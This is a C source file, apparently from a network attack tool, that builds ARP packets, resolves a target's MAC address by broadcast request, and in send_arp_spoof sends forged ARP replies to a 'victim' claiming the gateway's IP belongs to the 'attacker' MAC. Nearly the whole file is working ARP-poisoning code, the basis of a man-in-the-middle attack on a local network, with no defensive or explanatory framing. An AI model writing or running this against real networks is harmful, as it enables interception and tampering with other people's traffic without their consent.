#include "core.h"

ether_arp init_ether_arp(
    int op,
    Mac target_mac,
    u32 target_addr_hl,
    Mac source_mac,
    u32 source_addr_hl
) {
    ether_arp arp = {0};
    arp.arp_hrd = htons(ARPHRD_ETHER);
    arp.arp_pro = htons(ETH_P_IP);
    arp.arp_hln = ETHER_ADDR_LEN;
    arp.arp_pln = sizeof(in_addr_t);
    arp.arp_op = htons(op);

    memcpy(&arp.arp_sha, source_mac.bytes, sizeof(arp.arp_sha));
    memcpy(&arp.arp_spa, &source_addr_hl, sizeof(arp.arp_spa));
    memcpy(&arp.arp_tha, target_mac.bytes, sizeof(arp.arp_tha));
    memcpy(&arp.arp_tpa, &target_addr_hl, sizeof(arp.arp_tpa));

    return arp;
}

void broadcast_arp_request(
    int arp_sock,
    char* if_name,
    u32 target_addr_hl,
    u32 source_addr_hl,
    Mac source_mac
) {
    ether_arp req = init_ether_arp(
        ARPOP_REQUEST,
        BROADCAST_MAC,
        target_addr_hl,
        source_mac,
        source_addr_hl
    );
    sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, BROADCAST_MAC);

    if (sendto(
            arp_sock,
            &req,
            sizeof(ether_arp),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("ERROR: broadcast_arp_request, failed to send ether_arp "
               "request via arp_sock");
        close(arp_sock);
        exit(1);
    }
}

int request_target_mac(
    int arp_sock,
    char* if_name,
    Mac* target_mac,
    u32 target_addr_hl,
    int timeout_sec,
    int n_tries
) {
    u32 source_addr_hl = get_interface_addr_hl(if_name);
    Mac source_mac = get_interface_mac(if_name);

    u8 buffer[128];
    ether_arp* rep = (ether_arp*)&buffer;
    while (n_tries) {
        broadcast_arp_request(
            arp_sock, if_name, target_addr_hl, source_addr_hl, source_mac
        );

        if (receive_socket_reply(
                arp_sock, buffer, sizeof(buffer), timeout_sec
            )) {
            if (*(u32*)rep->arp_spa != target_addr_hl) {
                continue;
            }
            memcpy(target_mac->bytes, rep->arp_sha, sizeof(rep->arp_sha));
            return 1;
        }

        n_tries -= 1;
        fprintf(stderr, "WARNING: Failed to request mac. Retrying...\n");
    }

    return 0;
}

void send_arp_spoof(
    int arp_sock,
    char* if_name,
    Mac attacker_mac,
    u32 gateway_ip,
    Mac victim_mac,
    u32 victim_ip
) {
    sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, victim_mac);
    ether_arp spoof = init_ether_arp(
        ARPOP_REPLY, victim_mac, victim_ip, attacker_mac, gateway_ip
    );

    if (sendto(
            arp_sock,
            &spoof,
            sizeof(spoof),
            0,
            (sockaddr*)&addr_ll,
            sizeof(addr_ll)
        )
        == -1) {
        perror("ERROR: send_arp_spoof, failed to sendto a spoof via the "
               "arp_sock");
        close(arp_sock);
        exit(1);
    }
}
